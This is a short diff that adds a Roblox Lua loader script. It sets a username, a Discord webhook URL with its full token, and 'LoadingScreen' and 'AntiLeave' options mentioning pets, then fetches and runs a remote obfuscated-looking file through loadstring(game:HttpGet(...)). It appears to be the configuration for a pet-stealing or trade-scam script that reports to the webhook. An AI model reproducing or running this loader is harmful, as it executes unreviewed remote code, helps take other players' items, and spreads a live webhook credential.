@@ -1,0 +1,8 @@
+_G.UserName = "bigshepistodrippy" --// Write your Username
+_G.Webhook = "https://discord.com/api/webhooks/1128744061734506649/LMveC8MoZAufFU3hKUWZ5yv3pY4VYQZ7GFyhKxS6DIS2wg0qw2hFcnHxzeHpw-zBKyUu" -- Enter your Wehook
+
+_G.LoadingScreen = true --// False Is To Not Use The Loading Screen
+_G.AntiLeave = true --// False is to leave when pets enter
+_G.MouseLock = true --// True To Enable Mouse
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VaporeonScripts/AmongusSource/main/Protected_5338549184769121.txt%22))()
